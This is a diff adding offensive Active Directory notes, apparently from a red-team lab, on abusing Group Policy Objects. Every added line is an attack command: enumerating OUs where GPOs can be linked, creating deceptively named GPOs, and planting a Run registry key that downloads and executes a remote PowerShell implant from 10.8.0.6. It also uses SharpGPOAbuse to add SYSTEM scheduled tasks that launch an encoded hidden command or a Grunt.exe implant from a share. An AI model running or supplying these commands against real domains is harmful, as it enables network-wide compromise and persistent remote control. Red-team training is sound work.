@@ -241,6 +241,31 @@ Create GPOs
 Modify existing GPOs
 Link GPOs to OUs
 
+PowerShell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
+PowerShell Get-DomainComputer | ? { $_.DistinguishedName -match "OU=3268" -or $_.DistinguishedName -match "OU=5735" } | select DnsHostName
+
+GroupPolicy RSAT
+PowerShell $env:ComputerName
+PowerShell Get-Module -List -Name GroupPolicy | Select-Object -ExpandProperty ExportedCommands
+PowerShell New-GPO -Name 'Totally Legit GPO' | New-GPLink -Target 'OU=3268,OU=Workstations,DC=cyberbotic,DC=io'
+PowerShell Set-GPPrefRegistryValue -Name 'Totally Legit GPO' -Context Computer -Action Create -Key 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' -ValueName 'Updater' -Value 'powershell -w 1 -c "iex (new-object net.webclient).downloadstring(''http://10.8.0.6/HTTPGrunt.ps1'')"' -Type ExpandString
+
+SharpGPOAbuse
+PowerShell New-GPO -Name 'Another Totally Legit GPO' | New-GPLink -Target 'OU=5735,OU=Workstations,DC=cyberbotic,DC=io'
+Assembly /assemblyname:"SharpGPOAbuse" /parameters:"--AddComputerTask --TaskName \"Legit Task\" --Author NT AUTHORITY\SYSTEM --Command \"cmd.exe\" --Arguments \"/c powershell -nop -w hidden -enc [...snip...]\" --GPOName \"Another Totally Legit GPO\""
+PowerShell Find-DomainShare -CheckShareAccess
+Upload /filepath:"Grunt.exe"
+cmd.exe /c \\fs-1\software\Grunt.exe
+Assembly /assemblyname:"SharpGPOAbuse" /parameters:"--AddComputerTask --TaskName \"Rasta Task\" --Author NT AUTHORITY\SYSTEM --Command \"cmd.exe\" --Arguments \"/c \\fs-1\software\Grunt.exe\" --GPOName \"Rasta GPO\""
+
+
+
+
+
+
+
+
+
 
 
 
